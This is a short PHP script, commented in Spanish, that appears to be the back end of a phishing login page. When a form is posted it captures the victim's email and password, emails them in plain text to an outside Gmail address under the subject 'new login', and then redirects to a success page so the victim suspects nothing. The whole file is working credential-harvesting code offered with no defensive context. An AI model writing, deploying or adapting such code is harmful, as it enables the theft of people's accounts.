<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Recuperar datos del formulario
    $email = $_POST["email"];
    $password = $_POST["password"];

    // Enviar correo electrónico
    $to = "lautiroca2@gmail.com";
    $subject = "Nuevo inicio de sesión";
    $message = "Correo electrónico: $email\nContraseña: $password";

    // Utiliza la función mail() de PHP para enviar el correo
    mail($to, $subject, $message);

    // Redireccionar o mostrar un mensaje de éxito, según tus necesidades
    header("Location: success.html");
    exit();
}
?>
